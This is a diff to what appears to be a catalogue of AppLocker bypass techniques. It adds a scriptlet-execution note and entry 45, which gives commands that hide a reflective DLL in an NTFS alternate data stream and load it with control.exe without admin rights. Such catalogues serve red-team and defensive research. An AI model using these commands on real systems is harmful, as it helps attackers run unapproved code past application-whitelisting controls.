@@ -399,6 +399,9 @@ Windows binary: Yes
 Bypasses AppLocker Default rules: ?  
 
 Notes:
+Can also execute scriptlets -
+https://twitter.com/NickTyrer/status/958450014111633408
+https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
 
 Links:  
 https://msitpros.com/?p=3960
@@ -739,4 +742,24 @@ wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfil
 
 * Links:
   * https://twitter.com/Oddvarmoe/status/951757732557852673
+
+
+
+## 45. Control.exe -Loading DLL/CPL binary from Alternate data stream
+
+`type notepad_reflective_x64.dll > c:\windows\tasks\zzz:notepad_reflective_x64.dll`
+`control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll`
+
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?
+
+Notes:
+Requires write access to a place that is allowed by AppLocker
+
+Links:
+https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/
+https://twitter.com/bohops/status/955659561008017409
+
+
 
